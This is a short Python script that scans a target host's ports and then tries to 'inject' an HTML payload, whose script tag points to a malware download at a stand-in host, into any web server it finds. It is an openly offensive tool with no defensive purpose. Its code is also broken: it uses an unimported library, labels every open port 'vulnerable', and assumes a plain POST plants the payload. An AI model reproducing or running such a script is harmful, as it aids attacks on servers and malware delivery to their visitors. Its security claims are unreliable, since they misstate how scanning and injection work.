#!/usr/bin/env python3

import sys
import socket

def scan_ports(host, start_port, end_port):
    vulnerable_ports = []
    for port in range(start_port, end_port+1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            vulnerable_ports.append(port)
        sock.close()
    return vulnerable_ports

def create_payload():
    malware_url = "http://example.com/malware.exe"
    payload = "<html><body><script src='{}'></script></body></html>".format(malware_url)
    return payload

def inject_payload(host, port, payload):
    url = "http://{}:{}".format(host, port)
    if port == 80:
        headers = {"Content-Type": "text/html"}
        response = requests.post(url, data=payload, headers=headers)
        if response.status_code == 200:
            print("Payload injected successfully at {}:{}".format(host, port))
        else:
            print("Failed to inject payload at {}:{}".format(host, port))
    else:
        print("Port {} not supported for payload injection".format(port))

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: {} <host> <start_port> <end_port>".format(sys.argv[0]))
        sys.exit(1)
    host = sys.argv[1]
    start_port = int(sys.argv[2])
    end_port = int(sys.argv[3])
    vulnerable_ports = scan_ports(host, start_port, end_port)
    if vulnerable_ports:
        print("Vulnerable ports:", vulnerable_ports)
        payload = create_payload()
        for port in vulnerable_ports:
            inject_payload(host, port, payload)
    else:
        print("No vulnerable ports found.")
